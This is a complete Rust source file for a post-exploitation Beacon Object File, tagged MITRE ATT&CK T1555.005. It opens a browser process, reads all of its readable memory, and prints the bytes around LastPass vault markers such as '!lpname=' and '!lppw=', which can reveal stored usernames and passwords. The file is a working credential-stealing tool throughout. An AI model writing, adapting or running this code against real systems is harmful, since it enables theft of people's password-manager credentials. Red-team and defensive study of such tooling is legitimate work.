//! # LastPass BOF
//!
//! Scans browser process memory for LastPass vault data by searching for
//! known patterns such as "lastpass" vault markers and encrypted vault
//! content indicators. Enumerates committed readable memory regions using
//! VirtualQueryEx and reads each with ReadProcessMemory.
//! ## MITRE ATT&CK
//! - T1555.005 - Credentials from Password Stores: Password Managers
//!
//! ## Arguments
//! - `int`: Target browser process ID (0 to auto-detect is not supported;
//!   provide a specific PID).

#![no_std]

use alloc::vec;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{CloseHandle, FALSE, GetLastError};
use windows_sys::Win32::System::Threading::{
    OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
};

#[repr(C)]
struct MemoryBasicInformation {
    base_address: usize,
    allocation_base: usize,
    allocation_protect: u32,
    partition_id: u16,
    _pad: [u8; 6],
    region_size: usize,
    state: u32,
    protect: u32,
    type_: u32,
}

const MEM_COMMIT: u32 = 0x1000;
const PAGE_NOACCESS: u32 = 0x01;
const PAGE_GUARD: u32 = 0x100;

unsafe extern "system" {
    fn VirtualQueryEx(
        process: *mut core::ffi::c_void,
        address: *const core::ffi::c_void,
        buffer: *mut MemoryBasicInformation,
        length: usize,
    ) -> usize;

    fn ReadProcessMemory(
        process: *mut core::ffi::c_void,
        base_address: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        bytes_read: *mut usize,
    ) -> i32;
}

const PATTERNS: &[&[u8]] = &[
    b"lastpasssoftware",
    b"vault.lastpass.com",
    b"!lpname=",
    b"!lppw=",
    b"iterations=",
];

const MAX_REGION_SIZE: usize = 4 * 1024 * 1024;

fn find_patterns(buf: &[u8], base: usize) -> usize {
    let mut count = 0usize;

    for &pattern in PATTERNS {
        if buf.len() < pattern.len() {
            continue;
        }
        let mut i = 0;
        while i <= buf.len() - pattern.len() {
            let matched = buf[i..i + pattern.len()]
                .iter()
                .zip(pattern.iter())
                .all(|(&a, &b)| a.eq_ignore_ascii_case(&b));

            if matched {
                let start = if i >= 16 { i - 16 } else { 0 };
                let end = core::cmp::min(i + pattern.len() + 64, buf.len());
                let snippet = &buf[start..end];
                let display: alloc::vec::Vec<u8> = snippet
                    .iter()
                    .map(|&b| if (0x20..0x7f).contains(&b) { b } else { b'.' })
                    .collect();
                if let Ok(s) = core::str::from_utf8(&display) {
                    let pat_str = core::str::from_utf8(pattern).unwrap_or("?");
                    println!("  [0x{:X}] pattern='{}': {}", base + i, pat_str, s);
                    count += 1;
                }
                i += pattern.len();
            } else {
                i += 1;
            }
        }
    }
    count
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let pid = parser.get_int() as u32;

    if pid == 0 {
        eprintln!("Invalid PID - provide the browser process ID");
        return;
    }

    println!("lastpass: Scanning process {} for LastPass vault data", pid);

    let process = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid) };
    if process.is_null() {
        let err = unsafe { GetLastError() };
        eprintln!("Failed to open process {} (error {:#X})", pid, err);
        return;
    }

    let mut address: usize = 0;
    let mut total_found: usize = 0;
    let mut regions_scanned: u32 = 0;
    let mbi_size = core::mem::size_of::<MemoryBasicInformation>();

    loop {
        let mut mbi: MemoryBasicInformation = unsafe { core::mem::zeroed() };
        let ret = unsafe {
            VirtualQueryEx(
                process,
                address as *const core::ffi::c_void,
                &mut mbi,
                mbi_size,
            )
        };

        if ret == 0 {
            break;
        }

        if mbi.state == MEM_COMMIT
            && (mbi.protect & PAGE_NOACCESS) == 0
            && (mbi.protect & PAGE_GUARD) == 0
        {
            let size = core::cmp::min(mbi.region_size, MAX_REGION_SIZE);
            let mut buf = vec![0u8; size];
            let mut bytes_read: usize = 0;

            let ok = unsafe {
                ReadProcessMemory(
                    process,
                    mbi.base_address as *const core::ffi::c_void,
                    buf.as_mut_ptr() as *mut core::ffi::c_void,
                    size,
                    &mut bytes_read,
                )
            };

            if ok != 0 && bytes_read > 0 {
                let found = find_patterns(&buf[..bytes_read], mbi.base_address);
                total_found += found;
                regions_scanned += 1;
            }
        }

        address = mbi.base_address + mbi.region_size;
        if address <= mbi.base_address {
            break;
        }
    }

    unsafe { CloseHandle(process) };

    println!(
        "Scanned {} regions, found {} LastPass artifact(s)",
        regions_scanned, total_found
    );
    if total_found > 0 {
        println!("SUCCESS.");
    } else {
        println!("No LastPass vault data found in process memory.");
    }
}
